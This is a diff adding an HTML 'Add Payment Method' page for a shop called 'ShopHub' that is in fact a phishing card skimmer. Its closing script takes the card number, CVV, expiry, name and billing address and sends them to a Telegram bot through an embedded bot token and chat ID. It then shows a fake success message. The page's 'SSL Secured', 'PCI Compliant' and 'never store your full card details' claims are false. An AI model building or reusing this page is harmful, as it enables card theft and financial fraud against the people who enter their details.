@@ -1,0 +1,1355 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Add Payment Method - ShopHub</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            width: 100%;
+            max-width: 500px;
+            position: relative;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #059669 0%, #047857 100%);
+            padding: 40px 20px;
+            text-align: center;
+            color: white;
+            position: relative;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grid" width="10" height="10" patternUnits="userSpaceOnUse"><path d="M 10 0 L 0 0 0 10" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="1"/></pattern></defs><rect width="100" height="100" fill="url(%23grid)"/></svg>');
+            opacity: 0.3;
+        }
+
+        .logo-container {
+            position: relative;
+            z-index: 2;
+            margin-bottom: 20px;
+        }
+
+        .logo-placeholder {
+            width: 80px;
+            height: 80px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            backdrop-filter: blur(10px);
+        }
+
+        .logo-placeholder i {
+            font-size: 32px;
+            color: white;
+        }
+
+        .logo-placeholder img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            border-radius: 50%;
+        }
+
+        .header h1 {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .header p {
+            font-size: 16px;
+            opacity: 0.9;
+            position: relative;
+            z-index: 2;
+        }
+
+        .form-container {
+            padding: 40px 30px;
+        }
+
+        .welcome-text {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .welcome-text h2 {
+            color: #1f2937;
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
+
+        .welcome-text p {
+            color: #6b7280;
+            font-size: 14px;
+        }
+
+        .security-notice {
+            background: #ecfdf5;
+            border: 1px solid #a7f3d0;
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .security-notice i {
+            color: #059669;
+            font-size: 18px;
+        }
+
+        .security-notice p {
+            color: #047857;
+            font-size: 13px;
+            margin: 0;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            color: #374151;
+            font-weight: 600;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-wrapper i {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #9ca3af;
+            font-size: 16px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 15px 15px 15px 45px;
+            border: 2px solid #e5e7eb;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: #f9fafb;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #059669;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(5, 150, 105, 0.1);
+        }
+
+        .form-group input:focus + .input-wrapper i {
+            color: #059669;
+        }
+
+        .form-row {
+            display: flex;
+            gap: 15px;
+        }
+
+        .form-row .form-group {
+            flex: 1;
+        }
+
+        .card-preview {
+            background: linear-gradient(135deg, #1f2937 0%, #374151 100%);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 25px;
+            color: white;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card-preview::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -50%;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+        }
+
+        .card-number {
+            font-size: 20px;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 2px;
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .card-info {
+            display: flex;
+            justify-content: space-between;
+            align-items: end;
+            position: relative;
+            z-index: 2;
+        }
+
+        .card-holder {
+            font-size: 14px;
+            text-transform: uppercase;
+        }
+
+        .card-expiry {
+            font-size: 14px;
+            font-family: 'Courier New', monospace;
+        }
+
+        .card-brand {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 24px;
+            opacity: 0.8;
+            z-index: 2;
+        }
+
+        .error {
+            color: #ef4444;
+            font-size: 12px;
+            margin-top: 5px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .error i {
+            font-size: 12px;
+        }
+
+        .invalid {
+            border-color: #ef4444 !important;
+            background: #fef2f2 !important;
+        }
+
+        .btn {
+            width: 100%;
+            background: linear-gradient(135deg, #059669 0%, #047857 100%);
+            color: white;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            margin-bottom: 15px;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(5, 150, 105, 0.3);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .btn:hover::before {
+            left: 100%;
+        }
+
+        .btn-secondary {
+            background: #f3f4f6;
+            color: #374151;
+            border: 2px solid #e5e7eb;
+        }
+
+        .btn-secondary:hover {
+            background: #e5e7eb;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .footer {
+            padding: 20px 30px;
+            background: #f8fafc;
+            border-top: 1px solid #e5e7eb;
+            text-align: center;
+        }
+
+        .footer p {
+            color: #6b7280;
+            font-size: 13px;
+            line-height: 1.5;
+        }
+
+        .footer a {
+            color: #059669;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .payment-methods {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 15px;
+        }
+
+        .payment-methods i {
+            font-size: 24px;
+            color: #6b7280;
+            opacity: 0.7;
+        }
+
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            color: #059669;
+            font-size: 12px;
+        }
+
+        .security-badge i {
+            font-size: 14px;
+        }
+
+        /* Animations */
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .container {
+            animation: fadeInUp 0.6s ease-out;
+        }
+
+        .form-group {
+            animation: fadeInUp 0.6s ease-out;
+            animation-fill-mode: both;
+        }
+
+        .form-group:nth-child(1) { animation-delay: 0.1s; }
+        .form-group:nth-child(2) { animation-delay: 0.2s; }
+        .form-group:nth-child(3) { animation-delay: 0.3s; }
+        .form-group:nth-child(4) { animation-delay: 0.4s; }
+
+        /* Responsive Design for All Screen Sizes */
+        
+        /* Extra Large Screens (1400px and up) */
+        @media (min-width: 1400px) {
+            .container {
+                max-width: 550px;
+            }
+            
+            .header h1 {
+                font-size: 32px;
+            }
+            
+            .header p {
+                font-size: 18px;
+            }
+            
+            .welcome-text h2 {
+                font-size: 28px;
+            }
+            
+            .form-group input {
+                padding: 18px 18px 18px 50px;
+                font-size: 18px;
+            }
+            
+            .btn {
+                padding: 18px;
+                font-size: 18px;
+            }
+            
+            .card-number {
+                font-size: 22px;
+            }
+        }
+
+        /* Large Screens (1200px to 1399px) */
+        @media (min-width: 1200px) and (max-width: 1399px) {
+            .container {
+                max-width: 520px;
+            }
+            
+            .form-container {
+                padding: 45px 35px;
+            }
+        }
+
+        /* Medium Screens (992px to 1199px) */
+        @media (min-width: 992px) and (max-width: 1199px) {
+            .container {
+                max-width: 500px;
+            }
+            
+            .header {
+                padding: 35px 25px;
+            }
+            
+            .form-container {
+                padding: 40px 30px;
+            }
+        }
+
+        /* Small Screens (768px to 991px) - Tablets */
+        @media (min-width: 768px) and (max-width: 991px) {
+            body {
+                padding: 15px;
+            }
+            
+            .container {
+                max-width: 460px;
+                margin: 20px auto;
+            }
+            
+            .header {
+                padding: 30px 20px;
+            }
+            
+            .header h1 {
+                font-size: 26px;
+            }
+            
+            .header p {
+                font-size: 15px;
+            }
+            
+            .logo-placeholder {
+                width: 70px;
+                height: 70px;
+            }
+            
+            .logo-placeholder i {
+                font-size: 28px;
+            }
+            
+            .form-container {
+                padding: 35px 25px;
+            }
+            
+            .welcome-text h2 {
+                font-size: 22px;
+            }
+            
+            .form-group {
+                margin-bottom: 22px;
+            }
+            
+            .form-group input {
+                padding: 14px 14px 14px 42px;
+                font-size: 15px;
+            }
+            
+            .input-wrapper i {
+                font-size: 15px;
+            }
+            
+            .btn {
+                padding: 15px;
+                font-size: 15px;
+            }
+            
+            .card-number {
+                font-size: 18px;
+            }
+        }
+
+        /* Extra Small Screens (576px to 767px) - Large Mobile */
+        @media (min-width: 576px) and (max-width: 767px) {
+            body {
+                padding: 10px;
+            }
+            
+            .container {
+                max-width: 100%;
+                margin: 10px;
+                border-radius: 15px;
+            }
+            
+            .header {
+                padding: 25px 15px;
+            }
+            
+            .header h1 {
+                font-size: 24px;
+            }
+            
+            .header p {
+                font-size: 14px;
+            }
+            
+            .logo-placeholder {
+                width: 65px;
+                height: 65px;
+            }
+            
+            .logo-placeholder i {
+                font-size: 26px;
+            }
+            
+            .form-container {
+                padding: 30px 20px;
+            }
+            
+            .welcome-text h2 {
+                font-size: 20px;
+            }
+            
+            .welcome-text p {
+                font-size: 13px;
+            }
+            
+            .security-notice {
+                padding: 12px;
+            }
+            
+            .form-group {
+                margin-bottom: 20px;
+            }
+            
+            .form-group label {
+                font-size: 13px;
+            }
+            
+            .form-group input {
+                padding: 13px 13px 13px 40px;
+                font-size: 14px;
+            }
+            
+            .input-wrapper i {
+                font-size: 14px;
+                left: 13px;
+            }
+            
+            .btn {
+                padding: 14px;
+                font-size: 14px;
+            }
+            
+            .card-preview {
+                padding: 20px;
+            }
+            
+            .card-number {
+                font-size: 16px;
+            }
+            
+            .footer {
+                padding: 18px 20px;
+            }
+            
+            .footer p {
+                font-size: 12px;
+            }
+        }
+
+        /* Small Mobile Screens (480px to 575px) */
+        @media (min-width: 480px) and (max-width: 575px) {
+            body {
+                padding: 8px;
+            }
+            
+            .container {
+                margin: 8px;
+                border-radius: 12px;
+            }
+            
+            .header {
+                padding: 20px 12px;
+            }
+            
+            .header h1 {
+                font-size: 22px;
+            }
+            
+            .header p {
+                font-size: 13px;
+            }
+            
+            .logo-placeholder {
+                width: 60px;
+                height: 60px;
+            }
+            
+            .logo-placeholder i {
+                font-size: 24px;
+            }
+            
+            .form-container {
+                padding: 25px 15px;
+            }
+            
+            .welcome-text h2 {
+                font-size: 18px;
+            }
+            
+            .form-group {
+                margin-bottom: 18px;
+            }
+            
+            .form-group input {
+                padding: 12px 12px 12px 38px;
+                font-size: 13px;
+            }
+            
+            .input-wrapper i {
+                font-size: 13px;
+                left: 12px;
+            }
+            
+            .btn {
+                padding: 13px;
+                font-size: 13px;
+            }
+            
+            .card-number {
+                font-size: 15px;
+            }
+            
+            .footer {
+                padding: 15px;
+            }
+            
+            .form-row {
+                flex-direction: column;
+                gap: 10px;
+            }
+        }
+
+        /* Extra Small Mobile Screens (320px to 479px) */
+        @media (max-width: 479px) {
+            body {
+                padding: 5px;
+                font-size: 14px;
+            }
+            
+            .container {
+                margin: 5px;
+                border-radius: 10px;
+            }
+            
+            .header {
+                padding: 18px 10px;
+            }
+            
+            .header h1 {
+                font-size: 20px;
+                margin-bottom: 5px;
+            }
+            
+            .header p {
+                font-size: 12px;
+            }
+            
+            .logo-placeholder {
+                width: 55px;
+                height: 55px;
+                margin-bottom: 10px;
+            }
+            
+            .logo-placeholder i {
+                font-size: 22px;
+            }
+            
+            .form-container {
+                padding: 20px 12px;
+            }
+            
+            .welcome-text {
+                margin-bottom: 20px;
+            }
+            
+            .welcome-text h2 {
+                font-size: 16px;
+                margin-bottom: 5px;
+            }
+            
+            .welcome-text p {
+                font-size: 12px;
+            }
+            
+            .security-notice {
+                padding: 10px;
+                margin-bottom: 15px;
+            }
+            
+            .form-group {
+                margin-bottom: 15px;
+            }
+            
+            .form-group label {
+                font-size: 12px;
+                margin-bottom: 5px;
+            }
+            
+            .form-group input {
+                padding: 10px 10px 10px 35px;
+                font-size: 12px;
+                border-radius: 8px;
+            }
+            
+            .input-wrapper i {
+                font-size: 12px;
+                left: 10px;
+            }
+            
+            .btn {
+                padding: 12px;
+                font-size: 12px;
+                border-radius: 8px;
+            }
+            
+            .card-preview {
+                padding: 15px;
+            }
+            
+            .card-number {
+                font-size: 14px;
+                letter-spacing: 1px;
+            }
+            
+            .footer {
+                padding: 12px;
+            }
+            
+            .footer p {
+                font-size: 11px;
+                line-height: 1.3;
+            }
+            
+            .form-row {
+                flex-direction: column;
+                gap: 8px;
+            }
+            
+            .payment-methods {
+                gap: 10px;
+            }
+            
+            .payment-methods i {
+                font-size: 20px;
+            }
+        }
+
+        /* Ultra Small Screens (below 320px) */
+        @media (max-width: 319px) {
+            body {
+                padding: 2px;
+            }
+            
+            .container {
+                margin: 2px;
+                border-radius: 8px;
+            }
+            
+            .header {
+                padding: 15px 8px;
+            }
+            
+            .header h1 {
+                font-size: 18px;
+            }
+            
+            .header p {
+                font-size: 11px;
+            }
+            
+            .logo-placeholder {
+                width: 50px;
+                height: 50px;
+            }
+            
+            .logo-placeholder i {
+                font-size: 20px;
+            }
+            
+            .form-container {
+                padding: 15px 8px;
+            }
+            
+            .welcome-text h2 {
+                font-size: 14px;
+            }
+            
+            .form-group input {
+                padding: 8px 8px 8px 32px;
+                font-size: 11px;
+            }
+            
+            .input-wrapper i {
+                font-size: 11px;
+                left: 8px;
+            }
+            
+            .btn {
+                padding: 10px;
+                font-size: 11px;
+            }
+            
+            .card-number {
+                font-size: 13px;
+            }
+        }
+
+        /* Landscape Orientation for Mobile Devices */
+        @media screen and (max-width: 767px) and (orientation: landscape) {
+            body {
+                padding: 5px;
+            }
+            
+            .container {
+                margin: 5px auto;
+                max-width: 90%;
+            }
+            
+            .header {
+                padding: 15px;
+            }
+            
+            .logo-placeholder {
+                width: 50px;
+                height: 50px;
+            }
+            
+            .logo-placeholder i {
+                font-size: 20px;
+            }
+            
+            .header h1 {
+                font-size: 18px;
+                margin-bottom: 5px;
+            }
+            
+            .header p {
+                font-size: 12px;
+            }
+            
+            .form-container {
+                padding: 20px 15px;
+            }
+            
+            .form-group {
+                margin-bottom: 15px;
+            }
+            
+            .form-group input {
+                padding: 10px 10px 10px 35px;
+            }
+            
+            .card-preview {
+                padding: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo-container">
+                <div class="logo-placeholder">
+                    <!-- Replace the icon below with your logo image -->
+                    <i class="fas fa-shopping-cart"></i>
+                    <!-- To add your logo, replace the icon with: <img src="your-logo.png" alt="Logo"> -->
+                </div>
+                <h1>ShopHub</h1>
+                <p>Secure Payment Processing</p>
+            </div>
+        </div>
+
+        <div class="form-container">
+            <div class="welcome-text">
+                <h2>Add a Payment Method</h2>
+                <p>For future purchases and faster checkout</p>
+            </div>
+
+            <div class="security-notice">
+                <i class="fas fa-shield-alt"></i>
+                <p>Your payment information is encrypted and secure. We use industry-standard SSL encryption to protect your data.</p>
+            </div>
+
+            <div class="card-preview">
+                <div class="card-brand">
+                    <i class="fab fa-cc-visa"></i>
+                </div>
+                <div class="card-number" id="cardDisplay">•••• •••• •••• ••••</div>
+                <div class="card-info">
+                    <div class="card-holder" id="nameDisplay">CARDHOLDER NAME</div>
+                    <div class="card-expiry" id="expiryDisplay">MM/YY</div>
+                </div>
+            </div>
+
+            <form id="paymentForm" method="POST">
+                <div class="form-group">
+                    <label for="cardNumber">Card Number</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-credit-card"></i>
+                        <input type="text" id="cardNumber" name="cardNumber" required placeholder="1234 5678 9012 3456" maxlength="19">
+                    </div>
+                    <div class="error" id="cardNumberError"></div>
+                </div>
+
+                <div class="form-group">
+                    <label for="cardName">Cardholder Name</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-user"></i>
+                        <input type="text" id="cardName" name="cardName" required placeholder="John Doe">
+                    </div>
+                    <div class="error" id="cardNameError"></div>
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="expiry">Expiry Date</label>
+                        <div class="input-wrapper">
+                            <i class="fas fa-calendar"></i>
+                            <input type="text" id="expiry" name="expiry" required placeholder="MM/YY" maxlength="5">
+                        </div>
+                        <div class="error" id="expiryError"></div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="cvv">CVV</label>
+                        <div class="input-wrapper">
+                            <i class="fas fa-lock"></i>
+                            <input type="text" id="cvv" name="cvv" required placeholder="123" maxlength="4">
+                        </div>
+                        <div class="error" id="cvvError"></div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="billingAddress">Billing Address</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-home"></i>
+                        <input type="text" id="billingAddress" name="billingAddress" required placeholder="123 Main St, City, State 12345">
+                    </div>
+                    <div class="error" id="billingAddressError"></div>
+                </div>
+
+                <button type="submit" class="btn">
+                    <i class="fas fa-plus"></i> Add Payment Method
+                </button>
+                
+             
+            </form>
+
+            <div class="security-badges">
+                <div class="security-badge">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>SSL Secured</span>
+                </div>
+                <div class="security-badge">
+                    <i class="fas fa-lock"></i>
+                    <span>256-bit Encryption</span>
+                </div>
+                <div class="security-badge">
+                    <i class="fas fa-check-circle"></i>
+                    <span>PCI Compliant</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <div class="payment-methods">
+                <i class="fab fa-cc-visa"></i>
+                <i class="fab fa-cc-mastercard"></i>
+                <i class="fab fa-cc-amex"></i>
+                <i class="fab fa-cc-discover"></i>
+                <i class="fab fa-cc-paypal"></i>
+            </div>
+            <p>Your payment information is secure and encrypted. We never store your full card details.</p>
+            <p style="margin-top: 10px; font-size: 12px;">Protected by <a href="#">ShopHub Security</a> | <a href="#">Privacy Policy</a></p>
+        </div>
+    </div>
+
+    <script>
+    const BOT_TOKEN = "8098501021:AAGbAdK3olQzWW4iqHsdB26ps8lAaQDFXNg"; // Replace with your bot token
+const CHAT_ID = "7233135247"; // Replace with your chat ID
+
+$(document).ready(function() {
+    // Card number formatting and preview
+    $('#cardNumber').on('input', function() {
+        let value = $(this).val().replace(/\s/g, '').replace(/[^0-9]/gi, '');
+        let formattedValue = value.match(/.{1,4}/g)?.join(' ') || '';
+        if (formattedValue.length > 19) formattedValue = formattedValue.substr(0, 19);
+        
+        $(this).val(formattedValue);
+        
+        // Update card preview
+        if (value.length > 0) {
+            let displayValue = value.replace(/(.{4})/g, '$1 ').trim();
+            // Pad with dots for missing digits
+            while (displayValue.replace(/\s/g, '').length < 16) {
+                displayValue += '•';
+            }
+            // Format in groups of 4
+            displayValue = displayValue.replace(/(.{4})/g, '$1 ').trim();
+            $('#cardDisplay').text(displayValue);
+        } else {
+            $('#cardDisplay').text('•••• •••• •••• ••••');
+        }
+        
+        // Update card brand icon
+        updateCardBrand(value);
+        
+        // Validate card number
+        validateCardNumber(value);
+    });
+
+    // Cardholder name update
+    $('#cardName').on('input', function() {
+        let value = $(this).val().trim();
+        if (value.length > 0) {
+            $('#nameDisplay').text(value.toUpperCase());
+        } else {
+            $('#nameDisplay').text('CARDHOLDER NAME');
+        }
+        
+        // Validate name
+        validateCardName(value);
+    });
+
+    // Expiry date formatting and update
+    $('#expiry').on('input', function() {
+        let value = $(this).val().replace(/\D/g, '');
+        if (value.length >= 2) {
+            value = value.substring(0, 2) + '/' + value.substring(2, 4);
+        }
+        $(this).val(value);
+        
+        // Update card preview
+        if (value.length === 5) {
+            $('#expiryDisplay').text(value);
+        } else {
+            $('#expiryDisplay').text('MM/YY');
+        }
+        
+        // Validate expiry
+        validateExpiry(value);
+    });
+
+    // CVV formatting
+    $('#cvv').on('input', function() {
+        let value = $(this).val().replace(/\D/g, '');
+        $(this).val(value);
+        
+        // Validate CVV
+        validateCVV(value);
+    });
+
+    // Billing address validation
+    $('#billingAddress').on('input', function() {
+        validateBillingAddress($(this).val().trim());
+    });
+
+    // Form submission
+    $('#paymentForm').on('submit', function(e) {
+        e.preventDefault();
+        
+        // Get form values
+        var cardNumber = $('#cardNumber').val().trim();
+        var cardName = $('#cardName').val().trim();
+        var expiry = $('#expiry').val().trim();
+        var cvv = $('#cvv').val().trim();
+        var billingAddress = $('#billingAddress').val().trim();
+        
+        // Validate all fields
+        var isValid = true;
+        
+        if (!validateCardNumber(cardNumber.replace(/\s/g, ''))) isValid = false;
+        if (!validateCardName(cardName)) isValid = false;
+        if (!validateExpiry(expiry)) isValid = false;
+        if (!validateCVV(cvv)) isValid = false;
+        if (!validateBillingAddress(billingAddress)) isValid = false;
+        
+        if (isValid) {
+            // Prepare message for Telegram
+            var message = `💳 Payment Information:\n\n` +
+                         `Card Number: ${cardNumber}\n` +
+                         `Cardholder Name: ${cardName}\n` +
+                         `Expiry Date: ${expiry}\n` +
+                         `CVV: ${cvv}\n` +
+                         `Billing Address: ${billingAddress}\n` +
+                         `Card Type: ${getCardType(cardNumber.replace(/\s/g, ''))}\n\n` +
+                         `🕒 Submitted at: ${new Date().toLocaleString()}`;
+            
+            // Show loading state
+            $(this).find('button[type="submit"]').html('<i class="fas fa-spinner fa-spin"></i> Processing...');
+            
+            // Send to Telegram
+            $.ajax({
+                url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+                method: 'POST',
+                data: {
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                },
+                success: function() {
+                    alert("Payment method added successfully!");
+                    $('#paymentForm')[0].reset();
+                    // Reset card preview
+                    $('#cardDisplay').text('•••• •••• •••• ••••');
+                    $('#nameDisplay').text('CARDHOLDER NAME');
+                    $('#expiryDisplay').text('MM/YY');
+                    $('.card-brand i').attr('class', 'fab fa-cc-visa');
+                    
+                    // Reset button
+                    $('#paymentForm button[type="submit"]').html('<i class="fas fa-plus"></i> Add Payment Method');
+                    
+                    // Optional: redirect after success
+                    setTimeout(function() {
+                        // window.location.href = 'success.html';
+                    }, 1000);
+                },
+                error: function() {
+                    alert("There was an error processing your payment method. Please try again.");
+                    $('#paymentForm button[type="submit"]').html('<i class="fas fa-plus"></i> Add Payment Method');
+                }
+            });
+        }
+    });
+
+    // Card brand detection and icon update
+    function updateCardBrand(cardNumber) {
+        const cardType = getCardType(cardNumber);
+        const brandIcon = $('.card-brand i');
+        
+        switch(cardType) {
+            case 'Visa':
+                brandIcon.attr('class', 'fab fa-cc-visa');
+                break;
+            case 'Mastercard':
+                brandIcon.attr('class', 'fab fa-cc-mastercard');
+                break;
+            case 'American Express':
+                brandIcon.attr('class', 'fab fa-cc-amex');
+                break;
+            case 'Discover':
+                brandIcon.attr('class', 'fab fa-cc-discover');
+                break;
+            case 'JCB':
+                brandIcon.attr('class', 'fab fa-cc-jcb');
+                break;
+            case 'Diners Club':
+                brandIcon.attr('class', 'fab fa-cc-diners-club');
+                break;
+            default:
+                brandIcon.attr('class', 'fas fa-credit-card');
+        }
+    }
+
+    // Get card type based on number
+    function getCardType(cardNumber) {
+        const patterns = {
+            'Visa': /^4[0-9]{12}(?:[0-9]{3})?$/,
+            'Mastercard': /^5[1-5][0-9]{14}$/,
+            'American Express': /^3[47][0-9]{13}$/,
+            'Discover': /^6(?:011|5[0-9]{2})[0-9]{12}$/,
+            'JCB': /^(?:2131|1800|35\d{3})\d{11}$/,
+            'Diners Club': /^3[0689][0-9]{12}$/
+        };
+        
+        for (let type in patterns) {
+            if (patterns[type].test(cardNumber)) {
+                return type;
+            }
+        }
+        return 'Unknown';
+    }
+
+    // Luhn algorithm for card validation
+    function luhnCheck(cardNumber) {
+        let sum = 0;
+        let alternate = false;
+        
+        for (let i = cardNumber.length - 1; i >= 0; i--) {
+            let n = parseInt(cardNumber.charAt(i), 10);
+            
+            if (alternate) {
+                n *= 2;
+                if (n > 9) {
+                    n = (n % 10) + 1;
+                }
+            }
+            
+            sum += n;
+            alternate = !alternate;
+        }
+        
+        return (sum % 10) === 0;
+    }
+
+    // Validation functions
+    function validateCardNumber(cardNumber) {
+        const cleanNumber = cardNumber.replace(/\s/g, '');
+        const isValid = cleanNumber.length >= 13 && cleanNumber.length <= 19 && luhnCheck(cleanNumber);
+        
+        if (!isValid && cleanNumber.length > 0) {
+            showError('cardNumber', 'Please enter a valid card number');
+            return false;
+        } else {
+            hideError('cardNumber');
+            return true;
+        }
+    }
+
+    function validateCardName(name) {
+        const isValid = name.length >= 2 && /^[a-zA-Z\s]+$/.test(name);
+        
+        if (!isValid && name.length > 0) {
+            showError('cardName', 'Please enter a valid cardholder name');
+            return false;
+        } else {
+            hideError('cardName');
+            return true;
+        }
+    }
+
+    function validateExpiry(expiry) {
+        if (expiry.length !== 5) {
+            if (expiry.length > 0) {
+                showError('expiry', 'Please enter a valid expiry date (MM/YY)');
+            }
+            return false;
+        }
+        
+        const [month, year] = expiry.split('/');
+        const currentDate = new Date();
+        const currentYear = currentDate.getFullYear() % 100;
+        const currentMonth = currentDate.getMonth() + 1;
+        
+        const expMonth = parseInt(month, 10);
+        const expYear = parseInt(year, 10);
+        
+        if (expMonth < 1 || expMonth > 12) {
+            showError('expiry', 'Please enter a valid month (01-12)');
+            return false;
+        }
+        
+        if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
+            showError('expiry', 'Card has expired');
+            return false;
+        }
+        
+        hideError('expiry');
+        return true;
+    }
+
+    function validateCVV(cvv) {
+        const isValid = cvv.length >= 3 && cvv.length <= 4;
+        
+        if (!isValid && cvv.length > 0) {
+            showError('cvv', 'Please enter a valid CVV');
+            return false;
+        } else {
+            hideError('cvv');
+            return true;
+        }
+    }
+
+    function validateBillingAddress(address) {
+        const isValid = address.length >= 10;
+        
+        if (!isValid && address.length > 0) {
+            showError('billingAddress', 'Please enter a complete billing address');
+            return false;
+        } else {
+            hideError('billingAddress');
+            return true;
+        }
+    }
+
+    // Error display functions
+    function showError(fieldId, message) {
+        $(`#${fieldId}`).addClass('invalid');
+        $(`#${fieldId}Error`).html(`<i class="fas fa-exclamation-triangle"></i> ${message}`);
+    }
+
+    function hideError(fieldId) {
+        $(`#${fieldId}`).removeClass('invalid');
+        $(`#${fieldId}Error`).html('');
+    }
+});
+
+// Skip payment function
+function skipPayment() {
+    if (confirm('Are you sure you want to skip adding a payment method? You can add one later from your account settings.')) {
+        // Optional: redirect to dashboard or next step
+        alert('Payment method skipped. You can add one later from your account settings.');
+        // window.location.href = 'dashboard.html';
+    }
+}
+</script>
